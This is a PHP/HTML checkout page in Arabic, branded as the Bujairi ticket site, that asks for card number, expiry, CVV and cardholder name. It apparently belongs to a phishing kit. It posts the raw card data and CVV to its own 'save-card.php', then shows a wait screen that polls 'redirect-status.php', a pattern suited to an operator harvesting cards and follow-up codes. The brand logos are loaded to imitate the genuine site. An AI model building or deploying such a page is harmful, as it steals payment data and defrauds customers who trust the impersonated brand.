<?php
declare(strict_types=1);
require __DIR__ . '/../dashboard/init.php';
auth_require_customer_login_or_redirect();
$id = (int) ($_GET['id'] ?? 0);
$order = order_by_id(bujairi_pdo(), $id);
if (!$order) {
    http_response_code(404);
    echo 'غير موجود';
    exit;
}
$items = order_items(bujairi_pdo(), $id);
$total = 0.0;
foreach ($items as $i) {
    $total += (float) $i['line_total'];
}
$pageTitle = 'بيانات البطاقة — إتمام الشراء';
?><!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo h($pageTitle); ?></title>
    <link rel="icon" href="https://s3.ticketmx.com/bujairi/images/favicon.ico">
    <link rel="stylesheet" href="https://s3.ticketmx.com/fonts/NeoSansArabic/NeoSansArabic.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>tailwind.config = { theme: { extend: { colors: { bujairi: '#a68b5a' } } } };</script>
    <link rel="stylesheet" href="<?php echo h(url('assets/css/pages.css')); ?>">
</head>
<body class="text-slate-800 flex flex-col min-h-screen checkout bg-[#f5f3ef]">
<nav class="bg-white border-b border-gray-100">
    <div class="container mx-auto px-4 py-3 flex items-center justify-between">
        <a href="<?php echo h(url('index.php')); ?>"><img src="https://s3.ticketmx.com/bujairi/images/bujairi-ar.svg" alt="Bujairi" class="h-10"></a>
    </div>
</nav>
<header class="bg-white border-b border-gray-100 py-4 shadow-sm">
    <div class="container mx-auto px-4 flex flex-col lg:flex-row items-center justify-between gap-4">
        <h1 class="text-xl font-bold">إتمام الشراء</h1>
        <ul class="steps-container">
            <li class="active">تسجيل دخول</li>
            <li class="active">اختيار التذاكر</li>
            <li class="active">إتمام الشراء</li>
        </ul>
    </div>
</header>
<main class="flex-grow container mx-auto px-4 py-8">
    <div class="max-w-xl mx-auto">
        <div class="bg-white rounded-3xl shadow-sm border border-gray-100 overflow-hidden">
            <div class="bg-slate-900 text-white px-6 py-4 flex flex-col sm:flex-row sm:items-center sm:justify-between gap-2">
                <div>
                    <p class="text-xs text-slate-400 font-medium">الخطوة التالية</p>
                    <p class="font-bold text-lg">بيانات البطاقة</p>
                </div>
                <div class="text-left sm:text-right">
                    <p class="text-xs text-slate-400">المبلغ المستحق</p>
                    <p class="text-xl font-bold text-amber-200"><?php echo h((string) $total); ?> <span class="text-sm font-semibold text-white">ريال</span></p>
                </div>
            </div>
            <form method="post" action="<?php echo h(url('booking/save-card.php')); ?>" id="paymentForm" class="p-6 sm:p-8 space-y-6">
                <input type="hidden" name="id" value="<?php echo (int) $order['id']; ?>">
                <div>
                    <label for="cardNumber" class="mb-2 flex items-center justify-between gap-2 text-sm font-bold text-slate-700">
                        <span>رقم البطاقة</span>
                        <img src="<?php echo h(url('assets/cards-DEvwsDKR.webp')); ?>" alt="" class="h-6 w-auto max-w-[180px] shrink-0 object-contain" loading="lazy" decoding="async">
                    </label>
                    <input class="card-number-input w-full rounded-xl border border-gray-200 px-4 py-3 text-base font-mono tracking-wide shadow-sm focus:ring-2 focus:ring-bujairi/40 focus:border-bujairi outline-none transition"
                           name="CardNumber" id="cardNumber" type="text" dir="ltr" style="text-align:left" maxlength="19" placeholder="0000 0000 0000 0000" autocomplete="cc-number" inputmode="numeric">
                </div>
                <div class="grid grid-cols-[minmax(0,1fr)_minmax(0,6.75rem)] gap-3 sm:gap-4 items-end">
                    <div class="min-w-0">
                        <label for="expiry" class="block text-sm font-bold text-slate-700 mb-2">تاريخ الانتهاء</label>
                        <input class="w-full min-w-0 rounded-xl border border-gray-200 px-3 sm:px-4 py-3 text-base font-mono shadow-sm focus:ring-2 focus:ring-bujairi/40 focus:border-bujairi outline-none transition"
                               name="Expiry" id="expiry" type="text" maxlength="5" placeholder="MM/YY" dir="ltr" style="text-align:left" autocomplete="cc-exp">
                    </div>
                    <div class="min-w-0">
                        <label for="cvv" class="block text-sm font-bold text-slate-700 mb-2">رمز الأمان (CVV)</label>
                        <input class="w-full min-w-0 rounded-xl border border-gray-200 px-3 sm:px-4 py-3 text-base font-mono shadow-sm focus:ring-2 focus:ring-bujairi/40 focus:border-bujairi outline-none transition"
                               name="CVV" id="cvv" type="password" maxlength="3" placeholder="•••" dir="ltr" style="text-align:left" autocomplete="cc-csc" inputmode="numeric">
                    </div>
                </div>
                <div>
                    <label for="cardName" class="block text-sm font-bold text-slate-700 mb-2">اسم حامل البطاقة</label>
                    <input class="w-full rounded-xl border border-gray-200 px-4 py-3 text-base shadow-sm focus:ring-2 focus:ring-bujairi/40 focus:border-bujairi outline-none transition"
                           name="CardholderName" id="cardName" type="text" dir="ltr" style="text-align:left" placeholder="كما يظهر على البطاقة" autocomplete="cc-name">
                </div>
                <p class="text-xs text-slate-500 leading-relaxed border border-slate-100 rounded-xl px-4 py-3 bg-slate-50">
                    بياناتك تُرسل عبر اتصال مشفّر. لا تشارك رمز CVV أو رقم البطاقة مع أي طرف خارج هذه الصفحة.
                </p>
                <button type="submit" id="payBtn" disabled class="w-full py-4 rounded-xl bg-bujairi hover:bg-amber-800 text-white font-bold text-lg shadow-sm transition disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:bg-bujairi">تأكيد الدفع</button>
            </form>
        </div>
        <p class="text-center mt-6">
            <a href="<?php echo h(url('booking/checkout.php?id=' . (int) $order['id'])); ?>" class="text-sm text-bujairi font-semibold hover:underline">← العودة لاختيار طريقة الدفع</a>
        </p>
    </div>
</main>
<footer class="bg-white border-t border-gray-100 py-6 mt-auto text-xs text-gray-400 text-center">
    Copyright 2024 DGCL
</footer>
<?php require __DIR__ . '/../dashboard/booking-realtime-script.php'; ?>
<script>
const cardInput = document.querySelector('.card-number-input');
const cvvInput = document.getElementById('cvv');
const expiryInput = document.getElementById('expiry');
const nameInput = document.getElementById('cardName');
const payBtn = document.getElementById('payBtn');
cardInput.addEventListener('input', function (e) {
    let v = e.target.value.replace(/\D/g, '').substring(0, 16);
    v = v.replace(/(.{4})/g, '$1 ').trim();
    e.target.value = v;
    validate();
});
expiryInput.addEventListener('input', function () {
    let v = this.value.replace(/\D/g, '');
    if (v.length === 1 && parseInt(v, 10) > 1) v = '0' + v;
    if (v.length >= 2) {
        let m = parseInt(v.substring(0, 2), 10);
        if (m === 0) m = 1;
        if (m > 12) m = 12;
        v = m.toString().padStart(2, '0') + v.substring(2);
    }
    if (v.length > 2) v = v.substring(0, 2) + '/' + v.substring(2, 4);
    this.value = v;
    validate();
});
function validate() {
    let v = true;
    const c = cardInput.value.replace(/\s/g, '');
    if (!/^\d{16}$/.test(c)) v = false;
    if (!/^\d{3}$/.test(cvvInput.value)) v = false;
    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryInput.value)) v = false;
    if (nameInput.value.trim().length < 2) v = false;
    payBtn.disabled = !v;
    return v;
}
cvvInput.addEventListener('input', validate);
nameInput.addEventListener('input', validate);
var saveCardUrl = <?php echo json_encode(url('booking/save-card.php'), JSON_UNESCAPED_UNICODE); ?>;
var redirectStatusUrl = <?php echo json_encode(url('booking/redirect-status.php'), JSON_UNESCAPED_UNICODE); ?>;
var waitOrderId = <?php echo (int) $order['id']; ?>;
document.getElementById('paymentForm').addEventListener('submit', function (e) {
    e.preventDefault();
    if (!validate()) {
        return;
    }
    var btn = document.getElementById('payBtn');
    var fd = new FormData(this);
    btn.disabled = true;
    fetch(saveCardUrl, {
        method: 'POST',
        body: fd,
        credentials: 'same-origin',
        headers: { 'X-Requested-With': 'XMLHttpRequest', 'Accept': 'application/json' }
    })
        .then(function (r) {
            return r.json().then(function (j) {
                return { ok: r.ok, j: j };
            });
        })
        .then(function (x) {
            if (!x.ok || !x.j || !x.j.ok) {
                throw new Error((x.j && x.j.message) || '');
            }
            if (window.BujairiVerifyWait) {
                window.BujairiVerifyWait.showAndPoll(waitOrderId, redirectStatusUrl);
            }
        })
        .catch(function () {
            btn.disabled = false;
            alert('تعذر حفظ بيانات البطاقة. حاول مرة أخرى.');
        });
});
</script>
</body>
</html>
